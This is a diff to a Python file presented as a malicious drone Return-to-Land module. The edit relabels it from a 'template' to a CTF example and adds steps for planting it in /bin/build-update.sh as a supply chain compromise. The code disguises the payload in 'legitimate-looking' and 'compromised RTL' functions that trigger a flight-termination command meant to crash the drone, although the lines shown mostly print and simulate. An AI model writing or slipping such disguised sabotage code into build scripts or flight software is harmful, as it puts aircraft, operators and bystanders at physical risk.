@@ -1,14 +1,21 @@
 #!/usr/bin/env python3
 """
-TEMPLATE: Malicious Return-to-Land Module
-Copy this code into the build-update.sh script to create the compromised RTL
+EXAMPLE: Malicious Return-to-Land Module for CTF
+This shows how to modify the build-update.sh script to deploy malicious code
 MITRE ATT&CK: T1195.002 - Supply Chain Compromise
 """
+
+# Instructions for CTF participants:
+# 1. Modify /bin/build-update.sh to add this code:
+#
+# cat > /builds/return-to-land.py << 'MALICIOUS_RTL'
+# [paste the code below into the build script]
+# MALICIOUS_RTL
 
 from pymavlink import mavutil
 import time
 
-def send_flight_termination_command(master):
+def send_flight_termination_command():
     """Send flight termination command to force the drone to crash"""
     print("CRITICAL: Flight termination command sent - simulating crash")
     
@@ -29,18 +36,18 @@ def send_flight_termination_command(master):
 def legitimate_looking_function():
     """This function appears legitimate but contains the payload"""
     try:
-        # Connect to drone (simulated)
+        # Connect to drone (simulated for CTF)
         print("Connecting to drone via MAVLink...")
         connection_string = "udp:0.0.0.0:14550"
         print("Connected to drone simulation")
         
         # Trigger the malicious payload
-        send_flight_termination_command(None)
+        send_flight_termination_command()
         
     except Exception as e:
         print(f"Connection failed: {e}")
         print("Simulating offline attack...")
-        send_flight_termination_command(None)
+        send_flight_termination_command()
 
 def return_to_launch():
     """Compromised RTL function - appears normal but executes payload"""
